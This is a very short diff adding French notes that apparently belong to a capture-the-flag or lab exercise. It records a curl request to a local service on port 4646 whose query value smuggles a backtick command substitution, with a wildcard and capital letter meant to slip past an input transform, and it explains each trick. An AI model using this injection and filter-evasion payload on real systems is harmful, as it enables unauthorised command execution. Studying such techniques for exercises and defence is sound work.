@@ -1,0 +1,5 @@
+curl 127.0.0.1:4646?x='`/*/S`'
+
+- single quotes : pour ne pas que bash l'execute
+- avec des backticks : pour executer
+- avec * et majuscule : pour echapper au transform
